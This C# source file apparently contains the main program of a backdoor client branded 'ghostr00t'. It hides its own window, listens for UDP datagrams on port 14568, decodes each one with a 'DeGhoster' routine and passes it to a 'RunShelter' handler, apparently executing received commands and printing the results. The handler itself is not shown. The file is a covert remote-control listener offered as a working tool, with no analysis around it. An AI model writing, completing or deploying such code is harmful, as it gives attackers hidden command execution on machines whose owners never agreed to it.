using Client.Shelter;
using System;
using System.Collections.Generic;
using System.Net;
using System.Net.Sockets;
using System.Text;
using System.Threading.Tasks;
using Client.Data;
using System.Runtime.InteropServices;

namespace Client
{
    class Program
    {
        private static Socket socket;
        private static ShelterHandler sh;
     

        public static void Listener()
        {
            IPEndPoint iPEndPoint = new IPEndPoint(IPAddress.IPv6Any,0);
            EndPoint endPoint = iPEndPoint as EndPoint;
            Byte[] data = new Byte[65535];
            socket.ReceiveFrom(data, ref endPoint);
            List<Byte> bytes = new List<Byte>(data);
            bytes.RemoveAll(b => b == 0);
            Console.WriteLine( "Got str : "+Encoding.ASCII.GetString(bytes.ToArray()));
            Console.WriteLine( sh.RunShelter(Encoding.ASCII.GetString(bytes.ToArray()).DeGhoster()));
            Listener();
            
        }
        static void Main(string[] args)
        {

            sh = new ShelterHandler() ;
            sh.HideWindow();
            socket = new Socket(AddressFamily.InterNetworkV6, SocketType.Dgram, ProtocolType.Udp);
            socket.SetSocketOption(SocketOptionLevel.IPv6, SocketOptionName.IPv6Only, false);
            socket.Bind(new IPEndPoint(IPAddress.IPv6Any,14568));
     
            Task task = Task.Factory.StartNew(Listener);
            Console.WriteLine(". . . . . ghostr00t . . . . . ");
            Console.ReadKey();
        }
        

        
    }
}
